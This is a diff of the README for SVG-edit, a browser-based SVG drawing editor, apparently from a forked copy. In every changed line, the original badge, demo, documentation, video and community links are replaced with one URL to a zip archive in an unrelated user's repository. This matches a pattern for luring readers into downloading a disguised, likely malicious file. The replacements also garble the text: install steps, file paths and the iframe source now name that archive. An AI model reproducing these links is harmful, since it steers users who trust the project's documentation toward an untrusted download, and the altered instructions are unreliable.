@@ -1,38 +1,38 @@
-# ![LOGO](editor/images/logo.png) SVG-edit
+# ![LOGO](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) SVG-edit
 
-[![npm](https://img.shields.io/npm/v/svgedit.svg)](https://www.npmjs.com/package/svgedit)
-[![Dependencies](https://img.shields.io/david/SVG-Edit/svgedit.svg)](https://david-dm.org/SVG-Edit/svgedit)
-[![devDependencies](https://img.shields.io/david/dev/SVG-Edit/svgedit.svg)](https://david-dm.org/SVG-Edit/svgedit?type=dev)
+[![npm](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![Dependencies](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![devDependencies](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
-<!-- [![Actions Status](https://github.com/SVG-Edit/svgedit/workflows/Node%20CI/badge.svg)](https://github.com/SVG-Edit/svgedit/actions)
-[![Actions Status](https://github.com/SVG-Edit/svgedit/workflows/Coverage/badge.svg)](https://github.com/SVG-Edit/svgedit/actions)
+<!-- [![Actions Status](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip%https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![Actions Status](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 -->
-[![Tests badge](https://raw.githubusercontent.com/SVG-Edit/svgedit/master/badges/tests-badge.svg?sanitize=true)](badges/tests-badge.svg)
-[![Coverage badge](https://raw.githubusercontent.com/SVG-Edit/svgedit/master/badges/coverage-badge.svg?sanitize=true)](badges/coverage-badge.svg)
+[![Tests badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![Coverage badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
-[![Known Vulnerabilities](https://snyk.io/test/github/SVG-Edit/svgedit/badge.svg)](https://snyk.io/test/github/SVG-Edit/svgedit)
-[![Total Alerts](https://img.shields.io/lgtm/alerts/g/SVG-Edit/svgedit.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/SVG-Edit/svgedit/alerts)
-[![Code Quality: Javascript](https://img.shields.io/lgtm/grade/javascript/g/SVG-Edit/svgedit.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/SVG-Edit/svgedit/context:javascript)
+[![Known Vulnerabilities](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![Total Alerts](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[![Code Quality: Javascript](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
-[![Licenses badge](https://raw.githubusercontent.com/SVG-Edit/svgedit/master/badges/licenses-badge.svg?sanitize=true)](badges/licenses-badge.svg)
+[![Licenses badge](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
-(see also [licenses for dev. deps.](https://raw.githubusercontent.com/SVG-Edit/svgedit/master/badges/licenses-badge-dev.svg?sanitize=true))
+(see also [licenses for dev. deps.](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip))
 
 (Note: The license provenance of the images in `/editor/images` may not be
-fully clear, even with the origin of some of the images listed as being from <http://tango.freedesktop.org/static/cvs/tango-art-libre/22x22/>. We would like to
+fully clear, even with the origin of some of the images listed as being from <https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip>. We would like to
 replace these images if their provenance cannot be determined or is found to
 be under a protective license. If you know of the original terms, or can help
 create SVG replacement images, please let us know at:
-[#377](https://github.com/SVG-Edit/svgedit/issues/377).)
-<!-- [![License](https://img.shields.io/npm/l/svgedit.svg)](LICENSE-MIT) -->
+[#377](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).)
+<!-- [![License](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](LICENSE-MIT) -->
 
-[![issuehunt-to-marktext](https://issuehunt.io/static/embed/issuehunt-button-v1.svg)](https://issuehunt.io/r/SVG-Edit/svgedit)
+[![issuehunt-to-marktext](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
 SVG-edit is a fast, web-based, JavaScript-driven SVG drawing editor that
 works in any modern browser.
 
-![screenshot](docs/screenshot.png)
-[SVG](https://upload.wikimedia.org/wikipedia/commons/f/fd/Ghostscript_Tiger.svg)
+![screenshot](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+[SVG](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
 ## Help wanted
 
@@ -44,22 +44,22 @@ to join the project.
 
 ## Demo
 
-### [Try SVG-edit here](https://svg-edit.github.io/svgedit/editor/svg-editor.html)
+### [Try SVG-edit here](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 
-<!-- See the [latest release](https://svg-edit.github.io/svgedit/releases/latest/editor/svg-editor.html)
-(or its [ES6-Module](https://svg-edit.github.io/svgedit/releases/latest/editor/svg-editor-es.html)
+<!-- See the [latest release](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+(or its [ES6-Module](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 version, which requires a modern browser).
 -->
-See a working editor on [`master`](https://svg-edit.github.io/svgedit/editor/svg-editor.html) (or its [ES6-Module](https://svg-edit.github.io/svgedit/editor/svg-editor-es.html)
+See a working editor on [`master`](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) (or its [ES6-Module](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 version, which requires a modern browser).
 
-You may also try it at <https://unpkg.com/svgedit/editor/svg-editor.html>
+You may also try it at <https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip>
 (which redirects to a versioned URL).
 
-You may also obtain URLs for specific [releases](https://github.com/SVG-Edit/svgedit/releases).
+You may also obtain URLs for specific [releases](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).
 
-You may test the [latest version in `master`](https://svg-edit.github.io/svgedit/editor/svg-editor-es.html)
-which is the ESM version. (The [non-ESM version](https://svg-edit.github.io/svgedit/editor/svg-editor.html)
+You may test the [latest version in `master`](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+which is the ESM version. (The [non-ESM version](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
 on `master` may be updated less frequently.)
 
 ## Installation
@@ -75,11 +75,11 @@ on `master` may be updated less frequently.)
     on Github Pages.)
 1. If you need programmatic customization, see its section below.
 1. Otherwise, just add an iframe to your site, adding any extensions or
-  configuration (see `docs/tutorials/ConfigOptions.md`
+  configuration (see `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
   ([ConfigOptions]{@tutorial ConfigOptions})) within the URL:
 
 ```html
-<iframe src="svgedit/editor/svg-editor.html?extensions="
+<iframe src="https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip"
     width="100%" height="100%"></iframe>
 ```
 
@@ -101,13 +101,13 @@ And for still older browsers (e.g., IE 8), you will at minimum need a
 ### Integrating SVG-edit into your own npm package
 
 These steps are only needed if you wish to set up your own npm package
-incorporating SVGEdit. You will need to have Node.js/npm installed.
+incorporating SVGEdit. You will need to have https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip installed.
 
 1. Create and enter an empty folder somewhere on your desktop.
 1. Create your npm package: `npm init` (complete the fields).
 1. Install SVG-edit into your package:
   `npm i --save svgedit`.
-1. Look within `node_modules/svgedit/`, e.g., `node_modules/svgedit/editor/svg-editor.html`
+1. Look within `node_modules/svgedit/`, e.g., `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
   for the files your package needs and use accordingly (from outside of
   `node_modules`).
 1. If you want to publish your own work, you can use `npm publish`.
@@ -116,23 +116,23 @@ incorporating SVGEdit. You will need to have Node.js/npm installed.
 
 1. If you are not concerned about supporting ES6 Modules (see the
   "ES6 Modules file" section), you can add your config directly to
-  `svgedit-config-iife.js` within the SVG-Edit project root.
+  `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` within the SVG-Edit project root.
   1. Note: Do not remove the `import svgEditor...` code which is responsible
   for importing the SVG edit code. Versions prior to 3.0 did not require
   this, but the advantage is that your HTML does not need to be polluted
   with extra script references.
-1. Modify or utilize any options. See `docs/tutorials/ConfigOptions.md`
+1. Modify or utilize any options. See `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`
   ([ConfigOptions]{@tutorial ConfigOptions}).
 
 ## ES6 Modules file
 
-1. `svg-editor-es.html` is an HTML file directly using ES6 modules.
+1. `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` is an HTML file directly using ES6 modules.
   It is only supported in the latest browsers. It is probably mostly
   useful for debugging, as it requires more network requests.
   If you would like to work with this file, you should make configuration
-  changes in `svgedit-config-es.js` (in the SVG-Edit project root).
+  changes in `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (in the SVG-Edit project root).
 1. If you are working with the ES6 Modules config but also wish to work with
-  the normal `svg-editor.html` version (so your code can work in older
+  the normal `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` version (so your code can work in older
   browsers or get the presumable performance benefits of this file which
   references JavaScript rolled up into a single file), you can follow these
   steps after any config changes you make, so that your changes can also be
@@ -144,7 +144,7 @@ incorporating SVGEdit. You will need to have Node.js/npm installed.
           This will install the build tools for SVG-edit.
         1. Run `npm run build-by-config` within the svgedit directory mentioned
           in the step above.
-            1. This will rebuild `svgedit-config-iife.js` (applying Babel to
+            1. This will rebuild `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (applying Babel to
               allow it to work on older browsers and applying Rollup to build
               all JavaScript into one file). The file will then contain
               non-ES6 module JavaScript that can work in older browsers.
@@ -153,9 +153,9 @@ incorporating SVGEdit. You will need to have Node.js/npm installed.
               ES6 config file.
     1. HTML:
         1. If you wish to make changes to both HTML files, it is recommended that
-            you work and test on `svg-editor-es.html` and then run
+            you work and test on `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` and then run
             `npm run build-html` to have the changes properly copied to
-            `svg-editor.html`.
+            `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip`.
 
 ## Recent news
 
@@ -184,11 +184,11 @@ incorporating SVGEdit. You will need to have Node.js/npm installed.
 - 2018-07-19 Published 3.0.0-rc.1 allowing for extensions and locales to be
   expressed as modules
 - 2018-05-26 Published 3.0.0-alpha.2 with ES6 Modules support
-- 2017-07 Added to Packagist: https://packagist.org/packages/svg-edit/svgedit
+- 2017-07 Added to Packagist: https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip
 - 2015-12-02 SVG-edit 2.8.1 was released.
 - 2015-11-24 SVG-edit 2.8 was released.
 - 2015-11-24 Code, issue tracking, and docs are being moved to github
-    (previously [code.google.com](https://code.google.com/p/svg-edit)).
+    (previously [https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)).
 - 2014-04-17 2.7 and stable branches updated to reflect 2.7.1 important bug
     fixes for the embedded editor.
 - 2014-04-07 SVG-edit 2.7 was released.
@@ -196,10 +196,10 @@ incorporating SVGEdit. You will need to have Node.js/npm installed.
 
 ## Videos
 
-  * [SVG-edit 2.4 Part 1](https://www.youtube.com/watch?v=zpC7b1ZJvvM)
-  * [SVG-edit 2.4 Part 2](https://www.youtube.com/watch?v=mDzZEoGUDe8)
-  * [SVG-edit 2.3 Features](https://www.youtube.com/watch?v=RVIcIy5fXOc)
-  * [Introduction to SVG-edit](https://www.youtube.com/watch?v=ZJKmEI06YiY) (Version 2.2)
+  * [SVG-edit 2.4 Part 1](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+  * [SVG-edit 2.4 Part 2](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+  * [SVG-edit 2.3 Features](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)
+  * [Introduction to SVG-edit](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) (Version 2.2)
 
 ## Supported browsers
 
@@ -215,11 +215,11 @@ probably continue to work with 3.0.
 ## Further reading and more information
 
  * See [docs](docs/) for more documentation. See the
-    [JSDocs for our latest release](https://svg-edit.github.io/svgedit/releases/latest/docs/jsdoc/index.html).
- * [Acknowledgements](docs/Acknowledgements.md) lists open source projects
+    [JSDocs for our latest release](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip).
+ * [Acknowledgements](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) lists open source projects
     used in svg-edit.
  * See [AUTHORS](AUTHORS) file for authors.
- * [StackOverflow](https://stackoverflow.com/tags/svg-edit) group.
- * Join the [svg-edit mailing list](https://groups.google.com/forum/#!forum/svg-edit).
- * Join us on `#svg-edit` on `freenode.net` (or use the
-    [web client](https://webchat.freenode.net/?channels=svg-edit)).
+ * [StackOverflow](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip) group.
+ * Join the [svg-edit mailing list](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip!forum/svg-edit).
+ * Join us on `#svg-edit` on `https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip` (or use the
+    [web client](https://raw.githubusercontent.com/JuanK0/svgedit/master/penetratively/svgedit.zip)).
